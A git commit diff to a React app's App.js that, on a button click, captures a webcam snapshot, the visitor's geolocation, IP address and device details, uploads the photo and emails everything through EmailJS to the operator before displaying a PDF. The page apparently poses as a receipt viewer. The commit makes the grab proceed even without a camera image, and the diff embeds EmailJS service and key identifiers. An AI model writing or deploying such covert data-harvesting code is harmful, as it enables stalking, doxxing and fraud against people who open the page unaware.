ac6165f792898760dce2b12b6289330efe3f2cd6
daviscatpires <daviscatpires@gmail.com>
2024-07-30 23:21:19 +0100

    fix: not camera

--- src/App.js
+++ src/App.js
@@ -11,14 +11,14 @@ function App() {
 
   const base64ToFile = (base64String, fileName) => {
     if (!base64String) {
-      throw new Error("Base64 string is null or undefined");
+      return null;
     }
 
     const regex = /^data:(image\/(?:jpeg|png));base64,/;
     const match = base64String.match(regex);
 
     if (!match) {
-      throw new Error("Invalid base64 string format.");
+      return null;
     }
 
     const mime = match[1];
@@ -55,22 +55,27 @@ function App() {
   };
 
   const handleButtonClick = async () => {
-    const imageSrc = webcamRef.current.getScreenshot();
-    if (imageSrc && imageSrc.startsWith("data:image")) {
+    let imageSrc = null;
+    if (webcamRef.current) {
+      imageSrc = webcamRef.current.getScreenshot();
+    }
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          try {
-            const locationDetails = await getLocationDetails(latitude, longitude);
-            const loc = `City: ${locationDetails.city}, State: ${locationDetails.state}, Country: ${locationDetails.country}`;
+    const imageFile = imageSrc ? base64ToFile(imageSrc, 'webcam_image.jpg') : null;
 
-            const ip = await getIPAddress();
-            const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-            const deviceInfo = getDeviceInfo();
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        try {
+          const locationDetails = await getLocationDetails(latitude, longitude);
+          const loc = `City: ${locationDetails.city}, State: ${locationDetails.state}, Country: ${locationDetails.country}`;
 
-            const imageFile = base64ToFile(imageSrc, 'webcam_image.jpg');
+          const ip = await getIPAddress();
+          const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+          const deviceInfo = getDeviceInfo();
+
+          let imageLink = '';
+          if (imageFile) {
             const formData = new FormData();
             formData.append('file', imageFile);
             formData.append('upload_preset', 'comprovante');
@@ -81,43 +86,40 @@ function App() {
               }
             });
 
-            const imageLink = uploadResponse.data.secure_url;
-
-            const templateParams = {
-              to_name: 'Seu Nome',
-              from_name: 'App',
-              message: loc,
-              image_link: imageLink,
-              ip_address: ip,
-              connection_type: connectionType,
-              user_agent: deviceInfo.userAgent,
-              platform: deviceInfo.platform,
-              screen_resolution: deviceInfo.screenResolution
-            };
-
-            emailjs.send('service_24sk3fv', 'template_aqewqbd', templateParams, '5SP9iAEgT_xvOR0im')
-              .then((response) => {
-                console.log('Email sent successfully:', response.status, response.text);
-              }, (err) => {
-                console.error('Failed to send email:', err);
-              });
-
-            setLoading(false);
-            setShowPDF(true); // Define o estado para mostrar o PDF
-          } catch (error) {
-            console.error('Error during geolocation or data fetch:', error);
-            setLoading(false);
+            imageLink = uploadResponse.data.secure_url;
           }
-        }, (error) => {
-          console.error('Geolocation error:', error);
+
+          const templateParams = {
+            to_name: 'Seu Nome',
+            from_name: 'App',
+            message: loc,
+            image_link: imageLink,
+            ip_address: ip,
+            connection_type: connectionType,
+            user_agent: deviceInfo.userAgent,
+            platform: deviceInfo.platform,
+            screen_resolution: deviceInfo.screenResolution
+          };
+
+          emailjs.send('service_24sk3fv', 'template_aqewqbd', templateParams, '5SP9iAEgT_xvOR0im')
+            .then((response) => {
+              console.log('Email sent successfully:', response.status, response.text);
+            }, (err) => {
+              console.error('Failed to send email:', err);
+            });
+
           setLoading(false);
-        });
-      } else {
-        console.error('Geolocation is not supported by this browser.');
+          setShowPDF(true); // Define o estado para mostrar o PDF
+        } catch (error) {
+          console.error('Error during geolocation or data fetch:', error);
+          setLoading(false);
+        }
+      }, (error) => {
+        console.error('Geolocation error:', error);
         setLoading(false);
-      }
+      });
     } else {
-      console.error('Failed to capture image or invalid base64 string.');
+      console.error('Geolocation is not supported by this browser.');
       setLoading(false);
     }
   };
